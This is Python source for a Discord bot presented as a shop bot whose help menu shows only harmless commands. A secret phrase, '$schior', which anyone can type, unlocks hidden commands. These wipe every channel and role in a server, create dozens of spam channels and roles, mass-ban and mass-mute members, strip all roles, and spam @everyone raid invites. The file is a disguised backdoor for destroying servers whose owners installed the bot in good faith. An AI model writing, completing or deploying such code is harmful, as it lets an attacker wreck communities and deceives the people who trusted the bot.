import discord
from discord.ext import commands
import json
import asyncio
import random
import os

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)

# Secret activation
ACTIVATED_BY = None
AUTHORIZED_USER_ID = None

# Load config
def load_config():
    if not os.path.exists("config.json"):
        return {}
    with open("config.json", "r") as f:
        return json.load(f)

config = load_config()
REDEEMED_USERS = config.get("redeemed", {})          # user_id: staff_role_id
MUTED_MEMBERS = {}                                   # guild_id -> {user_id: expiry_timestamp}

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print("Secret prefix: $schior")
    print("Normal prefix: .")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # Secret activation phrase
    if message.content.strip().lower() == "$schior":
        global ACTIVATED_BY, AUTHORIZED_USER_ID
        ACTIVATED_BY = message.author
        AUTHORIZED_USER_ID = message.author.id
        await message.channel.send("Activated")
        await message.delete()
        return

    # Only allow secret commands if activated by the same person in this session
    is_secret_authorized = (
        ACTIVATED_BY is not None and
        message.author.id == AUTHORIZED_USER_ID
    )

    # Redeem command (normal prefix)
    if message.content.startswith("$redeem "):
        key = message.content.split(" ", 1)[1].strip()
        keys = config.get("keys", [])
        if key in keys:
            await message.channel.send("Key accepted. Now reply with the **staff role ID** you want to link to your account.")
            
            def check(m):
                return m.author.id == message.author.id and m.channel.id == message.channel.id

            try:
                msg = await bot.wait_for("message", check=check, timeout=60.0)
                try:
                    role_id = int(msg.content.strip())
                    REDEEMED_USERS[str(message.author.id)] = role_id
                    config["redeemed"] = REDEEMED_USERS
                    with open("config.json", "w") as f:
                        json.dump(config, f, indent=4)
                    await msg.reply("Staff role linked. You can now use staff commands.")
                except ValueError:
                    await msg.reply("That's not a valid role ID.")
            except asyncio.TimeoutError:
                await message.channel.send("Timed out. Try redeeming again.")
        else:
            await message.reply("Invalid or already used key.")
        await message.delete()
        return

    # Normal help – only shows safe commands
    if message.content == ".help":
        embed = discord.Embed(title="Schior’s Shop Bot Commands", color=0x00ff00)
        embed.add_field(name=".help", value="Shows this message", inline=False)
        embed.add_field(name=".ping", value="Check if bot is alive", inline=False)
        embed.set_footer(text="Redeem a key with $redeem <key> to unlock more features")
        await message.channel.send(embed=embed)
        return

    # Fake normal commands (require redeemed key)
    if message.content.startswith("."):
        user_id_str = str(message.author.id)
        if user_id_str not in REDEEMED_USERS:
            if message.content not in [".help", ".ping"]:
                await message.reply("You need to redeem a key first with `$redeem <key>`")
                return

    await bot.process_commands(message)

# ─── Normal / redeemed commands ───

@bot.command()
async def ping(ctx):
    await ctx.send(f"Pong! {round(bot.latency * 1000)}ms")

@bot.command()
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount: int):
    await ctx.channel.purge(limit=amount + 1)
    await ctx.send(f"Purged {amount} messages.", delete_after=5)

@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send(f"Banned {member}")

@bot.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, user_id: int):
    user = await bot.fetch_user(user_id)
    await ctx.guild.unban(user)
    await ctx.send(f"Unbanned {user}")

@bot.command()
@commands.has_permissions(manage_roles=True)
async def addrole(ctx, member: discord.Member, role: discord.Role):
    await member.add_roles(role)
    await ctx.send(f"Added {role.name} to {member}")

@bot.command()
@commands.has_permissions(moderate_members=True)
async def to(ctx, member: discord.Member, duration: str):
    # Very basic duration parser
    time = 0
    if duration.endswith("s"):
        time = int(duration[:-1])
    elif duration.endswith("m"):
        time = int(duration[:-1]) * 60
    elif duration.endswith("d"):
        time = int(duration[:-1]) * 86400
    else:
        return await ctx.send("Use s/m/d (seconds/minutes/days)")

    await member.timeout(discord.utils.utcnow() + discord.utils.timedelta(seconds=time), reason="Timed out via .to")
    await ctx.send(f"Timed out {member} for {duration}")

@bot.command()
@commands.has_permissions(moderate_members=True)
async def rto(ctx, member: discord.Member):
    await member.timeout(None)
    await ctx.send(f"Removed timeout from {member}")

# ─── SECRET DESTRUCTIVE COMMANDS (only after $schior) ───

@bot.command(hidden=True)
async def nuke(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    guild = ctx.guild

    # Delete channels
    for ch in guild.channels:
        try:
            await ch.delete()
        except:
            pass

    # Create spam channels
    for i in range(50):
        try:
            await guild.create_text_channel(f"nuked-by-schior-{i+1}")
        except:
            pass

    # Spam roles
    for i in range(80):
        try:
            role = await guild.create_role(name="Schior")
            for member in guild.members:
                try:
                    await member.add_roles(role)
                except:
                    pass
        except:
            pass

    # Delete old roles (except @everyone)
    for role in guild.roles:
        if role != guild.default_role:
            try:
                await role.delete()
            except:
                pass

    await ctx.send("Nuked.")

@bot.command(hidden=True)
async def banall(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    for member in ctx.guild.members:
        if member != ctx.guild.me and not member.guild_permissions.administrator:
            try:
                await member.ban(reason="banall by Schior")
            except:
                pass
    await ctx.send("Banned as many as possible.")

@bot.command(hidden=True)
async def muteall(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    for member in ctx.guild.members:
        if member != ctx.guild.me:
            try:
                await member.timeout(discord.utils.utcnow() + discord.utils.timedelta(days=28))
            except:
                pass
    await ctx.send("Muted as many as possible.")

@bot.command(hidden=True)
async def demoall(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    for member in ctx.guild.members:
        try:
            await member.edit(roles=[ctx.guild.default_role])
        except:
            pass
    await ctx.send("Removed roles from everyone possible.")

@bot.command(hidden=True)
async def raid(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    invite = "https://discord.gg/schiorshop"
    for channel in ctx.guild.text_channels[:15]:  # limit spam
        try:
            await channel.send(f"@everyone if you want to raid/nuke join {invite}")
        except:
            pass
    await ctx.send("Raid message spammed.")

# Run bot
bot.run(os.getenv("DISCORD_TOKEN"))
